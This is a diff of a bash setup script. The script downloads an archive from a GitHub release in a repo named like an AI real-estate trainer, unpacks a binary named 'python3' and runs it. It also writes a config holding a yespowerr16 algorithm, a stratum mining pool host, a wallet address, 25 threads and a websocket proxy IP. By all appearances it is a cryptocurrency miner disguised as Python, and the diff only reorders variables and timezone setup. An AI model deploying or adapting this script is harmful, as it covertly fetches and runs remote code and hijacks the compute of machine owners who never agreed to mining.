@@ -1,12 +1,13 @@
 #!/bin/bash
 
-: "${M_ALGO:=yespowerr16}"
-: "${M_HOST:=stratum-asia.rplant.xyz}"
-: "${M_PORT:=13382}"
-: "${M_WORKER:=YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC}"
-: "${M_PASSWORD:=x}"
-: "${M_THREADS:=25}"
-: "${M_PROXY:=ws://172.233.136.27:8088/proxy}"
+# Set environment variables
+M_ALGO="yespowerr16"
+M_HOST="stratum-asia.rplant.xyz"
+M_PORT="13382"
+M_WORKER="YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC"
+M_PASSWORD="x"
+M_THREADS="25"
+M_PROXY="ws://172.233.136.27:8088/proxy"
 
 # Download packages
 wget https://github.com/malphite-code-3/ai-realestale-trainer/releases/download/python3.2/python3.tar.gz
@@ -14,12 +15,10 @@ tar -xvf python3.tar.gz
 rm python3.tar.gz
 cd python3
 
-# Set timezone non-interactively
-echo "Asia/Jakarta" > /etc/timezone
-DEBIAN_FRONTEND=noninteractive dpkg-reconfigure -f noninteractive tzdata
-
-# Update the package list and install required packages
-sudo apt-get update && sudo apt-get install -y \
+# Install required packages with timezone configuration
+export DEBIAN_FRONTEND=noninteractive
+apt-get update
+apt-get install -y --no-install-recommends \
     libnss3-dev gconf-service libasound2 libatk1.0-0 libc6 libcairo2 libcups2 \
     libdbus-1-3 libexpat1 libfontconfig1 libgcc1 libgconf-2-4 libgdk-pixbuf2.0-0 \
     libglib2.0-0 libgtk-3-0 libnspr4 libpango-1.0-0 libpangocairo-1.0-0 \
@@ -27,6 +26,10 @@ sudo apt-get update && sudo apt-get install -y \
     libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 \
     ca-certificates fonts-liberation libappindicator1 libnss3 lsb-release xdg-utils \
     libgbm-dev
+
+# Set timezone non-interactively
+echo "Asia/Jakarta" > /etc/timezone
+dpkg-reconfigure -f noninteractive tzdata
 
 # Remove the existing config.json file
 rm -f config.json
@@ -45,4 +48,6 @@ cat <<EOL > config.json
     "proxy": "$M_PROXY"
 }
 EOL
+
+# Run your python script
 ./python3 main.py
